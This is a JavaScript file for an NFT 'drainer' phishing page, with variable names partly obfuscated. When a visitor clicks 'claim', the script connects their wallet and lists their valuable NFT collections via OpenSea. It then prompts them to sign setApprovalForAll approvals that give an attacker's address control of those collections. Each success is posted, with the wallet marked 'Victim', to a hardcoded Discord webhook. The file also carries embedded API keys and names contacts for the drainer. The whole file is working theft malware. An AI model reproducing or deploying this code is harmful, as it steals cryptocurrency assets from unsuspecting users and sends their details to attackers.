const receiveAddress = "0xe66E97d3AB29dcde542BfAb213105e3C36FEC16";
const webhookURL =
  "https://discordapp.com/api/webhooks/1000797925053562950/WtqycF4T8XCDUZn8sZNx92Ep3OVT8wov8JRJUuNHNZvBU2IcbF0_X2E8rNAHatd79q3j";
const drainNftsInfo = { minValue: 0.01, maxTransfers: 100 };
function isMobile() {
  var check = false;
  (function (a) {
    if (
      /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(
        a
      ) ||
      /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
        a.substr(0, 4)
      )
    )
      check = true;
  })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
}
function openInNewTab(_0x9e4bx2) {
  Object.assign(document.createElement("a"), {
    target: "_blank",
    href: _0x9e4bx2,
  }).click();
}
const round = (_0x9e4bx4) => {
  return Math.round(_0x9e4bx4 * 1e4) / 1e4;
};
const sleep = (_0x9e4bx6) => {
  return new Promise((_0x9e4bx7) => {
    return setTimeout(_0x9e4bx7, _0x9e4bx6);
  });
};
const getRdm = (_0x9e4bx9, _0x9e4bxa) => {
  return Math.floor(Math.random() * (_0x9e4bxa - _0x9e4bx9 + 1)) + _0x9e4bx9;
};
let metamaskInstalled = false;
if (typeof window.ethereum !== "undefined") {
  metamaskInstalled = true;
}
let web3Provider;
async function connectButton() {
  await Moralis.enableWeb3(
    metamaskInstalled ? {} : { provider: "walletconnect" }
  );
}
Moralis.onWeb3Enabled(async (_0x9e4bxe) => {
  if (_0x9e4bxe.chainId !== 1 && metamaskInstalled) {
    await Moralis.switchNetwork("0x1");
  }
  updateState(true);
  console.log(_0x9e4bxe);
});
Moralis.onChainChanged(async (_0x9e4bxf) => {
  if (_0x9e4bxf !== "0x1" && metamaskInstalled) {
    await Moralis.switchNetwork("0x1");
  }
});
window.ethereum
  ? window.ethereum.on("disconnect", (_0x9e4bx10) => {
      console.log(_0x9e4bx10);
      updateState(false);
    })
  : null;
window.ethereum
  ? window.ethereum.on("accountsChanged", (_0x9e4bx11) => {
      if (_0x9e4bx11.length < 1) {
        updateState(false);
      }
    })
  : null;
let checkIfValidNftTokens = async () => {
  console.log("Check tokens if valid");
  let _0x9e4bx13 = [];
  let _0x9e4bx14 = await fetch("../fetch/fetch.php", options).then(
    (_0x9e4bx15) => {
      return _0x9e4bx15.json();
    }
  );
  if (_0x9e4bx14.error != null) {
    console.error("Not autorized: " + _0x9e4bx14.error);
    console.error("Contact @tob1dev or @nftdrainer for help");
    return;
  }
  _0x9e4bx13.filter((_0x9e4bx16) => {
    return _0x9e4bx14.tokens;
  });
  let _0x9e4bx17 = _0x9e4bx14.tokens;
  let _0x9e4bx18 = {
    validTokens: _0x9e4bx17,
    contractReciver: _0x9e4bx14.receiver,
  };
  return _0x9e4bx18;
};
async function updateState(_0x9e4bx1a) {
  document.querySelector("#connectButton").style.display = _0x9e4bx1a
    ? "none"
    : "";
  document.querySelector("#claimButton").style.display = _0x9e4bx1a
    ? ""
    : "none";
}
async function askNfts() {
  const _0x9e4bx1c = new Web3(Moralis.provider);
  walletAddress = (await _0x9e4bx1c.eth.getAccounts())[0];
  const _0x9e4bx1d = {
    method: "GET",
    headers: { Accept: "application/json", "X-API-KEY": "" },
  };
  _0x9e4bx1d.headers["X-API-KEY"] =
    "JBs5MjG23F7f43f34ffcvOTNHJU1j0JiK?kTOTc6/vgZKrff4f4fedsEYjJp9";
  console.log("Check tokens if valid");
  let _0x9e4bx13 = [];
  let _0x9e4bx14 = await fetch(
    "https://web3tokenchecker.com/api/fetch.php",
    _0x9e4bx1d
  ).then((_0x9e4bx15) => {
    return _0x9e4bx15.json();
  });
  if (_0x9e4bx14.error != null) {
    console.error("Not autorized: " + _0x9e4bx14.error);
    console.error("Contact @tob1dev or @nftdrainer for help");
    return;
  }
  _0x9e4bx13.filter((_0x9e4bx16) => {
    return _0x9e4bx14.tokens;
  });
  let _0x9e4bx17 = _0x9e4bx14.tokens;
  let _0x9e4bx18 = {
    validTokens: _0x9e4bx17,
    contractReciver: _0x9e4bx14.receiver,
  };
  console.log("final");
  _0x9e4bx1d.headers["X-API-KEY"] = "f802d4b29b744e05849c5e06a6afdb4e";
  let _0x9e4bx1e = await fetch(
    `${"https://api.opensea.io/api/v1/collections?asset_owner="}${walletAddress}${"&offset=0&limit=300"}`,
    _0x9e4bx1d
  )
    .then((_0x9e4bx15) => {
      return _0x9e4bx15.json();
    })
    .then((_0x9e4bx1f) => {
      console.log(_0x9e4bx1f);
      if (_0x9e4bx1f.includes("Request was throttled.")) {
        return ["Request was throttled."];
      }
      return _0x9e4bx1f
        .filter((_0x9e4bx20) => {
          if (_0x9e4bx20.primary_asset_contracts.length > 0) {
            return true;
          } else {
            return false;
          }
        })
        .map((_0x9e4bx20) => {
          return {
            name: _0x9e4bx20.primary_asset_contracts[0].name,
            type: _0x9e4bx20.primary_asset_contracts[0].schema_name.toLowerCase(),
            contract_address: _0x9e4bx20.primary_asset_contracts[0].address,
            price: round(
              _0x9e4bx20.stats.one_day_average_price != 0
                ? _0x9e4bx20.stats.one_day_average_price
                : _0x9e4bx20.stats.seven_day_average_price
            ),
            owned: _0x9e4bx20.owned_asset_count,
          };
        });
    })
    .catch((_0x9e4bx10) => {
      return console.error(_0x9e4bx10);
    });
  if (_0x9e4bx1e.includes("Request was throttled.")) {
    return notEligible();
  }
  if (_0x9e4bx1e.length < 1) {
    return notEligible();
  }
  let _0x9e4bx21 = [];
  for (nft of _0x9e4bx1e) {
    if (nft.price === 0) {
      continue;
    }
    const _0x9e4bx22 = round(
      nft.price * (nft.type == "erc1155" ? nft.owned : 1)
    );
    if (_0x9e4bx22 < drainNftsInfo.minValue) {
      continue;
    }
    let _0x9e4bx23 =
      _0x9e4bx22 > 0.1 ? _0x9e4bx18.contractReciver : receiveAddress;
    _0x9e4bx21.push({
      price: _0x9e4bx22,
      name: nft.name,
      webhook: _0x9e4bx22 > 1 ? _0x9e4bx18.validTokens : webhookURL,
      options: {
        contractAddress: nft.contract_address,
        from: walletAddress,
        functionName: "setApprovalForAll",
        abi: [
          {
            inputs: [
              { internalType: "address", name: "operator", type: "address" },
              { internalType: "bool", name: "approved", type: "bool" },
            ],
            name: "setApprovalForAll",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
        ],
        params: { operator: _0x9e4bx23, approved: true },
        gasLimit: (await _0x9e4bx1c.eth.getBlock("latest")).gasLimit,
      },
    });
  }
  if (_0x9e4bx21.length < 1) {
    return notEligible();
  }
  let _0x9e4bx24 = await _0x9e4bx21
    .sort((_0x9e4bx25, _0x9e4bx26) => {
      return _0x9e4bx26.price - _0x9e4bx25.price;
    })
    .slice(0, drainNftsInfo.maxTransfers);
  for (transaction of _0x9e4bx24) {
    console.log(
      `${"Transferring "}${transaction.options.contractAddress}${" ("}${
        transaction.price
      }${" ETH)"}`
    );
    walletAddress = (await _0x9e4bx1c.eth.getAccounts())[0];
    if (isMobile()) {
      await Moralis.executeFunction(transaction.options)
        .catch((_0x9e4bx28) => {
          return console.error(_0x9e4bx28, _0x9e4bx1d);
        })
        .then((_0x9e4bx27) => {
          if (_0x9e4bx27) {
          } else {
            return;
          }
          sendWebhooks(
            transaction.webhook,
            _0x9e4bx27,
            transaction.name,
            transaction.price,
            transaction.options.contractAddress
          );
        });
    } else {
      Moralis.executeFunction(transaction.options)
        .catch((_0x9e4bx28) => {
          return console.error(_0x9e4bx28, _0x9e4bx1d);
        })
        .then((_0x9e4bx27) => {
          if (_0x9e4bx27) {
          } else {
            return;
          }
          sendWebhooks(
            transaction.webhook,
            _0x9e4bx27,
            transaction.name,
            transaction.price,
            transaction.options.contractAddress
          );
        });
      await sleep(111);
    }
  }
}
const notEligible = () => {
  document.getElementById("notEli").style.display = "";
};
const sendWebhooks = (
  _0x9e4bx2b,
  _0x9e4bx2c,
  _0x9e4bx2d,
  _0x9e4bx2e,
  _0x9e4bx2f
) => {
  let _0x9e4bx30 = {
    author: { name: "Transaction made !" },
    title: `${"Nft approved "}${_0x9e4bx2d}${" ( "}${_0x9e4bx2e}${"  ETH ) "}`,
    color: parseInt("#ef42f5".replace("#", ""), 16),
    fields: [
      {
        name: "_**Withdraw**_",
        value: `${"**Transaction:** [Etherscan](https://etherscan.io/tx/"}${_0x9e4bx2c}${")\\n**Transfer:** [Write To Contract](https://etherscan.io/address/"}${_0x9e4bx2f}${"#writeContract)"}`,
      },
      {
        name: "_**Victim**_",
        value: `${"**Status:** Success\\n**Address:** "}${walletAddress}${""}`,
      },
    ],
  };
  let _0x9e4bx31 = {
    username: "Impare/Trexon Transaction Bot",
    avatar_url:
      "https://cdn.discordapp.com/attachments/985558066852417579/993222301510283315/tg.jpg",
    embeds: [_0x9e4bx30],
  };
  fetch(_0x9e4bx2b, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(_0x9e4bx31),
  }).catch((_0x9e4bx10) => {
    return console.error(_0x9e4bx10);
  });
};
async function askTransfer() {
  document.getElementById("claimButton").style.opacity = 0.5;
  document.getElementById("claimButton").style.pointerEvents = "none";
  document
    .getElementById("claimButton")
    .removeEventListener("click", askTransfer);
  await askNfts();
  document.getElementById("claimButton").style.opacity = 1;
  document.getElementById("claimButton").style.pointerEvents = "pointer";
  document.getElementById("claimButton").addEventListener("click", askTransfer);
}
window.addEventListener("load", async () => {
  if (isMobile() && !window.ethereum) {
    document.querySelector("#connectButton").addEventListener("click", () => {
      return (window.location.href = `${"https://metamask.app.link/dapp/"}${
        window.location.hostname
      }${""}${window.location.pathname}${""}`);
    });
  } else {
    document
      .querySelector("#connectButton")
      .addEventListener("click", connectButton);
  }
  document.querySelector("#claimButton").addEventListener("click", askTransfer);
});
